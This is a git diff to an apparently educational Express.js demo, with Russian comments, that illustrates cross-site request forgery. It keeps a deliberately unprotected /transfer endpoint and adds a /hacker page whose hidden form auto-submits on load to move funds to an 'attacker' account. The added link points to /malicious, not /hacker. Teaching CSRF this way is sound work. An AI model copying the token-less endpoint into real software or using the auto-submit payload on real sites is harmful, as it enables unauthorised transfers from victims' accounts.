@@ -5,21 +5,21 @@ const cookieParser = require("cookie-parser");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Простая память: сессии и балансы
-const sessions = {}; // sessionId → username
-const accounts = { user1: 1000, attacker: 0 };
-
-// Парсит x‑www‑form‑urlencoded и куки
+// Middleware
 app.use(express.urlencoded({ extended: false }));
 app.use(cookieParser());
 
-// Главная страница (вход + уязвимая форма перевода)
+// Простая память
+const sessions = {}; // sessionId → username
+const accounts = { user1: 1000, attacker: 0 };
+
+// Главная (логин + форма перевода)
 app.get("/", (req, res) => {
   const sessionId = req.cookies.sessionId;
   const username = sessions[sessionId];
 
   if (!username) {
-    res.send(`
+    return res.send(`
       <h1>Добро пожаловать!</h1>
       <p>Залогиньтесь для демонстрации CSRF.</p>
       <form action="/login" method="post">
@@ -27,10 +27,8 @@ app.get("/", (req, res) => {
         <input type="submit" value="Войти">
       </form>
     `);
-    return;
   }
 
-  // Уязвимая форма перевода (без CSRF‑токена!)
   res.send(`
     <h1>Добро пожаловать, ${username}!</h1>
     <p>Баланс: ${accounts[username]} условных единиц</p>
@@ -42,10 +40,12 @@ app.get("/", (req, res) => {
       <input name="amount" value="100">
       <input type="submit" value="Перевести">
     </form>
+    <br>
+    <a href="/malicious">Открыть страницу злоумышленника (CSRF‑атака)</a>
   `);
 });
 
-// Логин и создание сессии
+// Логин
 app.post("/login", (req, res) => {
   const username = req.body.username || "user1";
 
@@ -53,15 +53,11 @@ app.post("/login", (req, res) => {
   sessions[sessionId] = username;
   if (!accounts[username]) accounts[username] = 1000;
 
-  res.cookie("sessionId", sessionId, {
-    httpOnly: true,
-    sameSite: "Lax", // пока оставим, но в демке можно убрать для наглядности
-  });
-
+  res.cookie("sessionId", sessionId, { httpOnly: true, sameSite: "Lax" });
   res.redirect("/");
 });
 
-// Уязвимый endpoint перевода (без проверки CSRF)
+// Уязвимый перевод
 app.post("/transfer", (req, res) => {
   const sessionId = req.cookies.sessionId;
   const from = sessions[sessionId];
@@ -84,6 +80,36 @@ app.post("/transfer", (req, res) => {
     <p>Баланс ${from}: ${accounts[from]}</p>
     <a href="/">Назад</a>
   `);
+});
+
+// Страница злоумышленника (CSRF‑атака)
+app.get("/hacker", (req, res) => {
+  res.send(`
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Злоумышленник: CSRF</title>
+</head>
+<body>
+  <h1>Фейковая страница с CSRF‑атакой</h1>
+  <p>
+    Если вы залогинены на этом же домене,
+    эта страница автоматически отправит форму перевода.
+  </p>
+
+  <form id="exploitForm" action="/transfer" method="post">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="100">
+  </form>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      document.getElementById("exploitForm").submit();
+    });
+  </script>
+</body>
+</html>
+`);
 });
 
 app.listen(PORT, () =>
